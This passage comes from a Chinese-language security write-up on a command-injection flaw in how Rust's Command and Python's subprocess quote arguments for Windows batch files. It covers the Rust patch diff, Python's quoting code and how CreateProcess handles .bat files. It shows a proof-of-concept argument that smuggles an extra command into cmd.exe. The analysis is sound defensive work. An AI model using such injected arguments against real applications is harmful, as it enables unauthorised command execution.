<code>force_quotes=false</code>，且参数 <code>arg</code> 中含有 <code>\t &amp;()[]{}^=;!&#39;+,`~%|&lt;&gt;</code> 中的任意特殊字符，则将 <code>force_quotes</code> 置为 <code>true</code></li><li>否则保持 <code>force_quotes</code> 不变</li></ul></li></ul><p>在 PoC 场景下（参数为 <code>aaa&quot; &amp; whoami</code>），这里传递给 <code>append_arg</code> 的参数会是 <code>force_quotes=true</code>。实际上，不管 <code>force_quotes</code> 是什么值，对 PoC 而言，在函数 <code>append_arg</code> 中，一定有：</p><ul><li><code>quote=true</code>，因为参数中含有空格符</li><li><code>escape = true</code>，因为是普通参数（即 <code>Command::arg</code> 或者 <code>Command::args</code>）</li></ul><p>所以，最终的命令行参数为 <code>cmd.exe /d /c &quot;&quot;D:\test.bat&quot; &quot;aaa\&quot; &amp; whoami&quot;&quot;</code>，这个对 <code>cmd.exe</code> 而言，会直接导致执行注入的命令 <code>whoami</code>。</p><h2 id="0x04-补丁分析"><a href="#0x04-补丁分析" class="headerlink" title="0x04. 补丁分析"></a>0x04. 补丁分析</h2><p>在 Rust 1.77.2 中（参考 <a href="https://github.com/rust-lang/rust/compare/1.77.1...1.77.2" target="_blank" rel="noopener">Rust 1.77.2 &amp; 1.77.1</a> Commit DIFF），对于 <code>make_bat_command_line</code> 函数，在使用普通参数的情况下（即 <code>Command::arg</code> 或者 <code>Command::args</code>），不再使用 <code>append_arg</code> 而是使用 <code>append_bat_arg</code> 来处理参数的引用，处理逻辑有所变化：</p><ul><li><code>append_arg</code> 处理逻辑：<code>&quot;</code> 转为 <code>\&quot;</code></li><li><code>append_bat_arg</code> 处理逻辑：<code>&quot;</code> 转为 <code>&quot;&quot;</code></li></ul><p>比如对于 PoC 代码，会转换成 <code>cmd.exe /e:ON /v:OFF /d /c &quot;&quot;D:\test.bat&quot; &quot;aaa&quot;&quot; &amp; whoami&quot;&quot;</code>，即 <code>aaa&quot; &amp; whoami</code> 转换成了 <code>&quot;aaa&quot;&quot; &amp; whoami&quot;</code>，这对 <code>cmd.exe</code> 而言，不会产生注入问题，参数会被当成一个整体。</p><p>补丁代码如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/library/std/src/sys/pal/windows/args.rs b/library/std/src/sys/pal/windows/args.rs</span><br><span class="line">index fbbdbc21265..48bcb89e669 100644</span><br><span class="line"><span class="comment">--- a/library/std/src/sys/pal/windows/args.rs</span></span><br><span class="line"><span class="comment">+++ b/library/std/src/sys/pal/windows/args.rs</span></span><br><span class="line"><span class="meta">@@ -7,7 +7,7 @@</span></span><br><span class="line"> mod tests;</span><br><span class="line"> </span><br><span class="line"> use super::os::current_exe;</span><br><span class="line"><span class="deletion">-use crate::ffi::OsString;</span></span><br><span class="line"><span class="addition">+use crate::ffi::&#123;OsStr, OsString&#125;;</span></span><br><span class="line"> use crate::fmt;</span><br><span class="line"> use crate::io;</span><br><span class="line"> use crate::num::NonZeroU16;</span><br><span class="line"><span class="meta">@@ -17,6 +17,7 @@</span></span><br><span class="line"> use crate::sys::process::ensure_no_nuls;</span><br><span class="line"> use crate::sys::&#123;c, to_u16s&#125;;</span><br><span class="line"> use crate::sys_common::wstr::WStrUnits;</span><br><span class="line"><span class="addition">+use crate::sys_common::AsInner;</span></span><br><span class="line"> use crate::vec;</span><br><span class="line"> </span><br><span class="line"> use crate::iter;</span><br><span class="line">@@ -262,16 +263,92 @@ pub(crate) fn append_arg(cmd: &amp;mut Vec&lt;u16&gt;, arg: &amp;Arg, force_quotes: bool) -&gt; i</span><br><span class="line">     Ok(())</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+fn append_bat_arg(cmd: &amp;mut Vec&lt;u16&gt;, arg: &amp;OsStr, mut quote: bool) -&gt; io::Result&lt;()&gt; &#123;</span></span><br><span class="line"><span class="addition">+    ensure_no_nuls(arg)?;</span></span><br><span class="line"><span class="addition">+    // If an argument has 0 characters then we need to quote it to ensure</span></span><br><span class="line"><span class="addition">+    // that it actually gets passed through on the command line or otherwise</span></span><br><span class="line"><span class="addition">+    // it will be dropped entirely when parsed on the other end.</span></span><br><span class="line"><span class="addition">+    //</span></span><br><span class="line"><span class="addition">+    // We also need to quote the argument if it ends with `\` to guard against</span></span><br><span class="line"><span class="addition">+    // bat usage such as `"%~2"` (i.e. force quote arguments) otherwise a</span></span><br><span class="line"><span class="addition">+    // trailing slash will escape the closing quote.</span></span><br><span class="line"><span class="addition">+    if arg.is_empty() || arg.as_encoded_bytes().last() == Some(&amp;b'\\') &#123;</span></span><br><span class="line"><span class="addition">+        quote = true;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+    for cp in arg.as_inner().inner.code_points() &#123;</span></span><br><span class="line"><span class="addition">+        if let Some(cp) = cp.to_char() &#123;</span></span><br><span class="line"><span class="addition">+            // Rather than trying to find every ascii symbol that must be quoted,</span></span><br><span class="line"><span class="addition">+            // we assume that all ascii symbols must be quoted unless they're known to be good.</span></span><br><span class="line"><span class="addition">+            // We also quote Unicode control blocks for good measure.</span></span><br><span class="line"><span class="addition">+            // Note an unquoted `\` is fine so long as the argument isn't otherwise quoted.</span></span><br><span class="line"><span class="addition">+            static UNQUOTED: &amp;str = r"#$*+-./:?@\_";</span></span><br><span class="line"><span class="addition">+            let ascii_needs_quotes =</span></span><br><span class="line"><span class="addition">+                cp.is_ascii() &amp;&amp; !(cp.is_ascii_alphanumeric() || UNQUOTED.contains(cp));</span></span><br><span class="line"><span class="addition">+            if ascii_needs_quotes || cp.is_control() &#123;</span></span><br><span class="line"><span class="addition">+                quote = true;</span></span><br><span class="line"><span class="addition">+            &#125;</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    if quote &#123;</span></span><br><span class="line"><span class="addition">+        cmd.push('"' as u16);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+    // Loop through the string, escaping `\` only if followed by `"`.</span></span><br><span class="line"><span class="addition">+    // And escaping `"` by doubling them.</span></span><br><span class="line"><span class="addition">+    let mut backslashes: usize = 0;</span></span><br><span class="line"><span class="addition">+    for x in arg.encode_wide() &#123;</span></span><br><span class="line"><span class="addition">+        if x == '\\' as u16 &#123;</span></span><br><span class="line"><span class="addition">+            backslashes += 1;</span></span><br><span class="line"><span class="addition">+        &#125; else &#123;</span></span><br><span class="line"><span class="addition">+            if x == '"' as u16 &#123;</span></span><br><span class="line"><span class="addition">+                // Add n backslashes to total 2n before internal `"`.</span></span><br><span class="line"><span class="addition">+                cmd.extend((0..backslashes).map(|_| '\\' as u16));</span></span><br><span class="line"><span class="addition">+                // Appending an additional double-quote acts as an escape.</span></span><br><span class="line"><span class="addition">+                cmd.push(b'"' as u16)</span></span><br><span class="line"><span class="addition">+            &#125; else if x == '%' as u16 || x == '\r' as u16 &#123;</span></span><br><span class="line"><span class="addition">+                // yt-dlp hack: replaces `%` with `%%cd:~,%` to stop %VAR% being expanded as an environment variable.</span></span><br><span class="line"><span class="addition">+                //</span></span><br><span class="line"><span class="addition">+                // # Explanation</span></span><br><span class="line"><span class="addition">+                //</span></span><br><span class="line"><span class="addition">+                // cmd supports extracting a substring from a variable using the following syntax:</span></span><br><span class="line"><span class="addition">+                //     %variable:~start_index,end_index%</span></span><br><span class="line"><span class="addition">+                //</span></span><br><span class="line"><span class="addition">+                // In the above command `cd` is used as the variable and the start_index and end_index are left blank.</span></span><br><span class="line"><span class="addition">+                // `cd` is a built-in variable that dynamically expands to the current directory so it's always available.</span></span><br><span class="line"><span class="addition">+                // Explicitly omitting both the start and end index creates a zero-length substring.</span></span><br><span class="line"><span class="addition">+                //</span></span><br><span class="line"><span class="addition">+                // Therefore it all resolves to nothing. However, by doing this no-op we distract cmd.exe</span></span><br><span class="line"><span class="addition">+                // from potentially expanding %variables% in the argument.</span></span><br><span class="line"><span class="addition">+                cmd.extend_from_slice(&amp;[</span></span><br><span class="line"><span class="addition">+                    '%' as u16, '%' as u16, 'c' as u16, 'd' as u16, ':' as u16, '~' as u16,</span></span><br><span class="line"><span class="addition">+                    ',' as u16,</span></span><br><span class="line"><span class="addition">+                ]);</span></span><br><span class="line"><span class="addition">+            &#125;</span></span><br><span class="line"><span class="addition">+            backslashes = 0;</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+        cmd.push(x);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+    if quote &#123;</span></span><br><span class="line"><span class="addition">+        // Add n backslashes to total 2n before ending `"`.</span></span><br><span class="line"><span class="addition">+        cmd.extend((0..backslashes).map(|_| '\\' as u16));</span></span><br><span class="line"><span class="addition">+        cmd.push('"' as u16);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+    Ok(())</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> pub(crate) fn make_bat_command_line(</span><br><span class="line">     script: &amp;[u16],</span><br><span class="line">     args: &amp;[Arg],</span><br><span class="line">     force_quotes: bool,</span><br><span class="line"> ) -&gt; io::Result&lt;Vec&lt;u16&gt;&gt; &#123;</span><br><span class="line"><span class="addition">+    const INVALID_ARGUMENT_ERROR: io::Error =</span></span><br><span class="line"><span class="addition">+        io::const_io_error!(io::ErrorKind::InvalidInput, r#"batch file arguments are invalid"#);</span></span><br><span class="line">     // Set the start of the command line to `cmd.exe /c "`</span><br><span class="line">     // It is necessary to surround the command in an extra pair of quotes,</span><br><span class="line">     // hence the trailing quote here. It will be closed after all arguments</span><br><span class="line">     // have been added.</span><br><span class="line"><span class="deletion">-    let mut cmd: Vec&lt;u16&gt; = "cmd.exe /d /c \"".encode_utf16().collect();</span></span><br><span class="line"><span class="addition">+    // Using /e:ON enables "command extensions" which is essential for the `%` hack to work.</span></span><br><span class="line"><span class="addition">+    let mut cmd: Vec&lt;u16&gt; = "cmd.exe /e:ON /v:OFF /d /c \"".encode_utf16().collect();</span></span><br><span class="line"> </span><br><span class="line">     // Push the script name surrounded by its quote pair.</span><br><span class="line">     cmd.push(b'"' as u16);</span><br><span class="line">@@ -291,18 +368,22 @@ pub(crate) fn make_bat_command_line(</span><br><span class="line">     // reconstructed by the batch script by default.</span><br><span class="line">     for arg in args &#123;</span><br><span class="line">         cmd.push(' ' as u16);</span><br><span class="line"><span class="deletion">-        // Make sure to always quote special command prompt characters, including:</span></span><br><span class="line"><span class="deletion">-        // * Characters `cmd /?` says require quotes.</span></span><br><span class="line"><span class="deletion">-        // * `%` for environment variables, as in `%TMP%`.</span></span><br><span class="line"><span class="deletion">-        // * `|&lt;&gt;` pipe/redirect characters.</span></span><br><span class="line"><span class="deletion">-        const SPECIAL: &amp;[u8] = b"\t &amp;()[]&#123;&#125;^=;!'+,`~%|&lt;&gt;";</span></span><br><span class="line"><span class="deletion">-        let force_quotes = match arg &#123;</span></span><br><span class="line"><span class="deletion">-            Arg::Regular(arg) if !force_quotes =&gt; &#123;</span></span><br><span class="line"><span class="deletion">-                arg.as_encoded_bytes().iter().any(|c| SPECIAL.contains(c))</span></span><br><span class="line"><span class="addition">+        match arg &#123;</span></span><br><span class="line"><span class="addition">+            Arg::Regular(arg_os) =&gt; &#123;</span></span><br><span class="line"><span class="addition">+                let arg_bytes = arg_os.as_encoded_bytes();</span></span><br><span class="line"><span class="addition">+                // Disallow \r and \n as they may truncate the arguments.</span></span><br><span class="line"><span class="addition">+                const DISALLOWED: &amp;[u8] = b"\r\n";</span></span><br><span class="line"><span class="addition">+                if arg_bytes.iter().any(|c| DISALLOWED.contains(c)) &#123;</span></span><br><span class="line"><span class="addition">+                    return Err(INVALID_ARGUMENT_ERROR);</span></span><br><span class="line"><span class="addition">+                &#125;</span></span><br><span class="line"><span class="addition">+                append_bat_arg(&amp;mut cmd, arg_os, force_quotes)?;</span></span><br><span class="line"><span class="addition">+            &#125;</span></span><br><span class="line"><span class="addition">+            _ =&gt; &#123;</span></span><br><span class="line"><span class="addition">+                // Raw arguments are passed on as-is.</span></span><br><span class="line"><span class="addition">+                // It's the user's responsibility to properly handle arguments in this case.</span></span><br><span class="line"><span class="addition">+                append_arg(&amp;mut cmd, arg, force_quotes)?;</span></span><br><span class="line">             &#125;</span><br><span class="line"><span class="deletion">-            _ =&gt; force_quotes,</span></span><br><span class="line">         &#125;;</span><br><span class="line"><span class="deletion">-        append_arg(&amp;mut cmd, arg, force_quotes)?;</span></span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     // Close the quote we left opened earlier.</span><br></pre></td></tr></table></figure><h2 id="0x05-Python-版本漏洞分析"><a href="#0x05-Python-版本漏洞分析" class="headerlink" title="0x05. Python 版本漏洞分析"></a>0x05. Python 版本漏洞分析</h2><h3 id="5-1-漏洞分析"><a href="#5-1-漏洞分析" class="headerlink" title="5.1 漏洞分析"></a>5.1 漏洞分析</h3><p>Python 同样存在上述问题，测试代码如下：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\&gt;<span class="title">python3</span></span></span><br><span class="line"><span class="function"><span class="title">Python</span> 3.11.6 (<span class="title">tags</span>/<span class="title">v3</span>.11.6:8<span class="title">b6ee5b</span>, <span class="title">Oct</span>  2 2023, 14:57:12) [<span class="title">MSC</span> <span class="title">v</span>.1935 64 <span class="title">bit</span> (<span class="title">AMD64</span>)] <span class="title">on</span> <span class="title">win32</span></span></span><br><span class="line"><span class="function"><span class="title">Type</span> "<span class="title">help</span>", "<span class="title">copyright</span>", "<span class="title">credits</span>" <span class="title">or</span> "<span class="title">license</span>" <span class="title">for</span> <span class="title">more</span> <span class="title">information</span>.</span></span><br><span class="line"><span class="function">&gt;&gt;&gt; <span class="title">import</span> <span class="title">subprocess</span></span></span><br><span class="line"><span class="function">&gt;&gt;&gt; <span class="title">subprocess.Popen</span>(['<span class="title">test.bat</span>', '<span class="title">aaa</span>" &amp; <span class="title">whoami</span>'])</span></span><br><span class="line"><span class="function">&lt;<span class="title">Popen</span>: <span class="title">returncode</span>: <span class="title">None</span> <span class="title">args</span>: ['<span class="title">test.bat</span>', '<span class="title">aaa</span>" &amp; <span class="title">whoami</span>']&gt;</span></span><br><span class="line"><span class="function">&gt;&gt;&gt; <span class="title">Argument</span> <span class="title">received</span>: "<span class="title">aaa</span>\"</span></span><br><span class="line"><span class="function"><span class="title">desktop</span>-618<span class="title">ia48</span>\<span class="title">ddw</span></span></span><br></pre></td></tr></table></figure><p>子进程的命令行参数为：<code>C:\WINDOWS\system32\cmd.exe /c test.bat &quot;aaa\&quot; &amp; whoami&quot;</code>。</p><p>Python 的代码可以参考 <a href="https://github.com/python/cpython/blob/4abca7e1e7e2764faf20c7e677ea5c9ea9dbffe2/Lib/subprocess.py#L580" target="_blank" rel="noopener">Lib/subprocess.py#L580</a>，不像 Rust 一样，这里没有专门处理 <code>.bat</code> 或 <code>.cmd</code>（<code>CreateProcess</code> 本身含有特殊的处理逻辑），但转义的逻辑是一致的，所以不影响漏洞触发。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list2cmdline</span><span class="params">(seq)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Translate a sequence of arguments into a command line</span></span><br><span class="line"><span class="string">    string, using the same rules as the MS C runtime:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    1) Arguments are delimited by white space, which is either a</span></span><br><span class="line"><span class="string">       space or a tab.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    2) A string surrounded by double quotation marks is</span></span><br><span class="line"><span class="string">       interpreted as a single argument, regardless of white space</span></span><br><span class="line"><span class="string">       contained within.  A quoted string can be embedded in an</span></span><br><span class="line"><span class="string">       argument.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    3) A double quotation mark preceded by a backslash is</span></span><br><span class="line"><span class="string">       interpreted as a literal double quotation mark.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    4) Backslashes are interpreted literally, unless they</span></span><br><span class="line"><span class="string">       immediately precede a double quotation mark.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    5) If backslashes immediately precede a double quotation mark,</span></span><br><span class="line"><span class="string">       every pair of backslashes is interpreted as a literal</span></span><br><span class="line"><span class="string">       backslash.  If the number of backslashes is odd, the last</span></span><br><span class="line"><span class="string">       backslash escapes the next double quotation mark as</span></span><br><span class="line"><span class="string">       described in rule 3.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># See</span></span><br><span class="line">    <span class="comment"># http://msdn.microsoft.com/en-us/library/17w5ykft.aspx</span></span><br><span class="line">    <span class="comment"># or search http://msdn.microsoft.com for</span></span><br><span class="line">    <span class="comment"># "Parsing C++ Command-Line Arguments"</span></span><br><span class="line">    result = []</span><br><span class="line">    needquote = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> map(os.fsdecode, seq):</span><br><span class="line">        bs_buf = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Add a space to separate this argument from the others</span></span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            result.append(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">        needquote = (<span class="string">" "</span> <span class="keyword">in</span> arg) <span class="keyword">or</span> (<span class="string">"\t"</span> <span class="keyword">in</span> arg) <span class="keyword">or</span> <span class="keyword">not</span> arg</span><br><span class="line">        <span class="keyword">if</span> needquote:</span><br><span class="line">            result.append(<span class="string">'"'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> arg:</span><br><span class="line">            <span class="keyword">if</span> c == <span class="string">'\\'</span>:</span><br><span class="line">                <span class="comment"># Don't know if we need to double yet.</span></span><br><span class="line">                bs_buf.append(c)</span><br><span class="line">            <span class="keyword">elif</span> c == <span class="string">'"'</span>:</span><br><span class="line">                <span class="comment"># Double backslashes.</span></span><br><span class="line">                result.append(<span class="string">'\\'</span> * len(bs_buf)*<span class="number">2</span>)</span><br><span class="line">                bs_buf = []</span><br><span class="line">                result.append(<span class="string">'\\"'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># Normal char</span></span><br><span class="line">                <span class="keyword">if</span> bs_buf:</span><br><span class="line">                    result.extend(bs_buf)</span><br><span class="line">                    bs_buf = []</span><br><span class="line">                result.append(c)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Add remaining backslashes, if any.</span></span><br><span class="line">        <span class="keyword">if</span> bs_buf:</span><br><span class="line">            result.extend(bs_buf)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> needquote:</span><br><span class="line">            result.extend(bs_buf)</span><br><span class="line">            result.append(<span class="string">'"'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(result)</span><br></pre></td></tr></table></figure><h3 id="5-2-CreateProcess"><a href="#5-2-CreateProcess" class="headerlink" title="5.2 CreateProcess"></a>5.2 CreateProcess</h3><p>MSDN 对 <code>CreateProcessW</code> 的说明文档有如下的解释：</p><blockquote><p><strong>[in, optional] lpApplicationName</strong></p><p>To run a batch file, you must start the command interpreter; set <code>lpApplicationName</code> to cmd.exe and set <code>lpCommandLine</code> to the following arguments: /c plus the name of the batch file.</p></blockquote><p>实际上，<code>lpApplicationName</code> 可以是 <code>.bat</code> 文件的路径，<code>CreateProcessW</code> 会自动进行相应的转换操作，测试代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Start the child process. </span></span><br><span class="line">    <span class="keyword">if</span> (!CreateProcess(<span class="string">L"D:\\test.bat"</span>, <span class="comment">// Application name</span></span><br><span class="line">        <span class="literal">NULL</span>,           <span class="comment">// Command line</span></span><br><span class="line">        <span class="literal">NULL</span>,           <span class="comment">// Process handle not inheritable</span></span><br><span class="line">        <span class="literal">NULL</span>,           <span class="comment">// Thread handle not inheritable</span></span><br><span class="line">        FALSE,          <span class="comment">// Set handle inheritance to FALSE</span></span><br><span class="line">        <span class="number">0</span>,              <span class="comment">// No creation flags</span></span><br><span class="line">        <span class="literal">NULL</span>,           <span class="comment">// Use parent's environment block</span></span><br><span class="line">        <span class="literal">NULL</span>,           <span class="comment">// Use parent's starting directory </span></span><br><span class="line">        &amp;si,            <span class="comment">// Pointer to STARTUPINFO structure</span></span><br><span class="line">        &amp;pi)            <span class="comment">// Pointer to PROCESS_INFORMATION structure</span></span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"CreateProcess failed (%d).\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait until child process exits.</span></span><br><span class="line">    WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close process and thread handles. </span></span><br><span class="line">    CloseHandle(pi.hProcess);</span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后启动的子进程的命令行参数为：<code>C:\WINDOWS\system32\cmd.exe /c &quot;D:\test.bat&quot;</code>。</p><p>这也是为什么在 Python 中通过 <code>subprocess</code> 运行 <code>.bat</code> 脚本时会自动运行 <code>cmd.exe</code> 的原因，而 Rust 可能也是出于安全上的考虑，主动屏蔽了 <code>CreateProcess</code> 的这一 Undocumented 特性。事实上，Rust 的补丁代码额外引入了一些 <code>cmd.exe</code> 的开关，可控性会更好。</p><h2 id="0x06-CMD-exe-命令行参数"><a href="#0x06-CMD-exe-命令行参数" class="headerlink" title="0x06. CMD.exe 命令行参数"></a>0x06. CMD.exe 命令行参数</h2><p>在 Unix 系统中，启动子进程时可以通过数组的方式指定 <code>argv</code> 和 <code>envp</code>（比如调用 <code>execve</code>）。但是在 Windows 下，<code>CreateProcess</code> 只能通过单一字符串的形式来接收命令行参数，这就给命令行参数的解析带来了挑战。好在 Windows 还提供了 <code>CommandLineToArgv</code> 这个 API 来实现命令行参数的解析，这可以保持一定的标准性，但是像 <code>cmd.exe</code> 这样的程序会有自己的命令行参数解析逻辑，这也是前面出现注入漏洞的原因。</p><p>文章 <a href="https://learn.microsoft.com/en-us/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way" target="_blank" rel="noopener">Everyone quotes command line arguments the wrong way</a> 提到：</p><blockquote><p>All of cmd’s transformations are triggered by the presence of one of the <em>metacharacters</em> <code>(, ), %, !, ^, &quot;, &lt;, &gt;, &amp;,</code> and <code>|</code>. <code>&quot;</code> is particularly interesting: when cmd is transforming a command line and sees a <code>&quot;</code>, it 